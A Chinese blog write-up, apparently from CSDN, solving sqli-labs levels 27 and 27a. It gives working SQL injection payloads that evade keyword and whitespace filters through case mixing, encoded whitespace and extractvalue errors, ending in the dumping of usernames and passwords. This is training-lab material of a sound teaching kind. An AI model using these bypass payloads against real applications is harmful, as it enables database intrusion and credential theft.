# 原创
：  （手工）【sqli-labs27、27a】报错回显、布尔盲注、过滤后注入

# （手工）【sqli-labs27、27a】报错回显、布尔盲注、过滤后注入

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less27（GET-Error based - All your UNION &amp; SELECT belong to us-string single quote）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（过滤-报错回显-单引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：判断字段数](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[三、Less27a（GET-Blind based - All your UNION &amp; SELECT belong to us Double quote ）](#%E4%BA%8C%E3%80%81Less25a%EF%BC%88GET-Blind%20based%20-%20All%20your%20OR%20%26%20AND%20belong%20to%20us-Intiger%20based%C2%A0%EF%BC%89)

[3.1、简介：（过滤-布尔盲注-双引号）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88Cookie%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89)

[3.2、特点：](#3.2%E3%80%81%E7%89%B9%E7%82%B9%EF%BC%9A)

[3.3、利用过程：](#2.2%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

---


> 
<h2>推荐：</h2>
[【SQL注入-无回显】布尔盲注：原理、函数、利用过程<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165770191616781818723356%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165770191616781818723356&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%B8%83%E5%B0%94&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165770191616781818723356%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165770191616781818723356&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E5%B8%83%E5%B0%94&amp;spm=1018.2226.3001.4450)
[【SQL注入】数字型注入 &amp; 字符型注入https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501)
[【WAF绕过】SQL注入、文件上传、XSShttps://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450)


---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 二、Less27（GET-Error based - All your UNION &amp; SELECT belong to us-string single quote）

> 
<h3>2.1、简介：（过滤-报错回显-单引号）</h3>
请求方法：GET
方法：过滤替换： /* , – , # , 空格 , /、union、select、UNION、SELECT、Union、Select+报错回显


> 
<h3>2.2、第一步：注入点测试</h3>
输入?id=1

 后面加上单引号发现报错了
说明是单引号闭合，即是字符型注入
且可利用报错回显




> 
<h3> 2.3、第二步：分析过滤</h3>
方法一：
考虑一步一步将注入语句字符一个一个替换掉，直到不报错（浪费时间）
或者全部替换（如果报错，不知道哪里被过滤了）
<hr/>
方法二：
获取源码进行白盒审计（最优）
<hr/>方法三： 
 eg：输入id=union（重要的都输进去）
看输入回显过滤语句的情况

<hr/>

最后可以知道被过滤的字符有
 /* , – , # , 空格 , /，/s
union、select、UNION、SELECT、Union、Select
<hr/>
替代空格：
%09  TAB 键（水平）
%0a  新建一行
%0c  新的一页
%0d  return 功能
%0b  TAB 键（垂直）
%a0  空格
空格换成 ||
<hr/>
注释被过滤掉了，就可以使用拼接进语句，将2侧进行闭合
<hr/>
union和select可以使用大小写混淆绕过，或者双写


---


---


---


> 
<h3>2.4、第三步：判断字段数</h3>



> 
<h3>2.5、第四步：暴库</h3>
?id=1'%26%26extractvalue(1, concat(0x7e, database()))%26%26'1

 或者
?id=0'unIon%0BSelEcT%0B1,database(),3||'1




> 
<h3>2.6、第五步：爆表名</h3>
?id=0'%0AunIon%0ASeLeCt%0A1,(SeLeCt%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'),3||'1



 或者
?id=0'||extractvalue(1,concat(0x7e,(sEleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())))||'




> 
<h3>2.7、第六步：爆字段</h3>
?id=0'%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema='security'%0bAnd%0btable_name='users'%0b%26%26%0b'1'='1


或者
?id=1'||extractvalue(1,concat(0x7e,(sEleCt(group_concat(column_name))from(information_schema.columns)where(table_schema)=(database())and(table_name)='users')))||'




> 
<h3>2.8、第七步：爆数据</h3>
?id=1'||extractvalue(1,concat(0x7e,(sEleCt(substr((group_concat(username,password)),1,32))from(users))))||'

或者
 ?id=0'/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws('$',id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/'1'='1




---


---


## 三、Less27a（GET-Blind based - All your UNION &amp; SELECT belong to us Double quote ）

> 
<h3>3.1、简介：（过滤-布尔盲注-双引号）</h3>
请求方法：GET
方法：过滤替换： /* , – , # , 空格 , /、union、select、UNION、SELECT、Union、Select+布尔盲注


> 
<h3>3.2、特点：</h3>
双引号字符型注入，可以使用union联合注入
无错误回显（即不能报错注入updatexml函数等）
正确和错误页面不同，可以进行布尔盲注，因为他有无错误回显
也可延时盲注


> 
<h3>3.3、利用过程：</h3>
基本上和Less26使用联合查询一样
进行布尔盲注（判断）
?id=0"unIon%0BSelEcT%0B1,database(),"3

…… 

